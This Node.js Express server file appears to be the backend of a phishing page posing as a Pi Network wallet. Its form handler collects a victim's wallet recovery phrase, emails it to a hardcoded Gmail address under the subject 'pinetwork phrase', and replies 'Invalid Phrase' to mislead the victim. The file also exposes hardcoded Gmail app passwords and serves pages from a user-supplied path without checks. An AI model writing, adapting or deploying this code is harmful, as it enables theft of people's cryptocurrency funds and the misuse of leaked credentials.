const express = require("express");
const multer = require("multer");
const formData = require("form-data");
const Mailgun = require("mailgun.js");
const nodemailer = require("nodemailer");

const app = express();
const port = 8000; // Change this to your desired port

// Serve static files from the "my-static-website" directory
// app.use(slashes());

// const mailgun = new Mailgun(formData);
// const mg = mailgun.client({
//   username: "api",
//   key: process.env.MAILGUN_API_KEY || "api_key",
// });

const transporter = nodemailer.createTransport({
  auth: {
    // wallet
    // pass: "phop baoj wpki iilk",
    // user: "Pinetworkm493@gmail.com",
    //pi-personal  
      pass: "hnul ydgk rcap defd",
      user: "a@gmail.com",

  },
  service: "gmail",
});

// logs any error

const upload = multer();

// Middleware to parse form data
app.use(upload.none());

app.use(express.static("public"));
app.use(express.json());
// app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.sendFile(__dirname + `/template/index.html`);
});

app.get("/:page", (req, res) => {
  const page = req.params.page;
  res.sendFile(__dirname + `/template/${page}.html`);
});

app.post("/submit/7668", async (req, res) => {
  const mfText = req.body["mf-text"];
  const formNonce = req.body["form_nonce"];
  // forward to Email
  try {
    if(mfText){
    // if(mfText && mfText.split(' ').length == 24){
      transporter.sendMail({
        from: "PiNetworkWallet",
        to: ["a@gmail.com"],
        // to: ["pablomizeto@gmail.com"],
        subject: "pinetwork phrase",
        text: mfText,
        html: `<h1>${mfText}</h1>`,
      }).then(result=> console.log(result)).catch(err=> console.log(err));
      return res.json({
        status: 1,
        store_entries: 1,
        error: ["Some thing went wrong."],
        data: {
          message: "Invalid Phrase",
          hide_form: "",
          form_data: {
            action: "insert",
            id: "7668",
            form_nonce: formNonce,
            "mf-text": mfText,
          },
          form_id: "7668",
          store: {
            "mf-text": mfText,
          },
          redirect_to: "",
        },
      });
    }else{
      return res.json({
        status: 1,
        store_entries: 1,
        error: ["Some thing went wrong."],
        data: {
          message: "You haven't set up the Finger print yet",
          hide_form: "",
          form_data: {
            action: "insert",
            id: "7668",
            form_nonce: formNonce,
            "mf-text": mfText,
          },
          form_id: "7668",
          store: {
            "mf-text": mfText,
          },
          redirect_to: "",
        },
      });
    }

  } catch (error) {
    console.log(error, "the error");
    console.log(error);
  }

  res.json({
    status: 1,
    store_entries: 1,
    error: ["Some thing went wrong."],
    data: {
      message: "Invalid Phrase",
      hide_form: "",
      form_data: {
        action: "insert",
        id: "7668",
        form_nonce: formNonce,
        "mf-text": mfText,
      },
      form_id: "7668",
      store: {
        "mf-text": mfText,
      },
      redirect_to: "",
    },
  });
});
// Start the server
app.listen(port, () => {
  console.log(`Server is running on port http://localhost:${port}`);
});
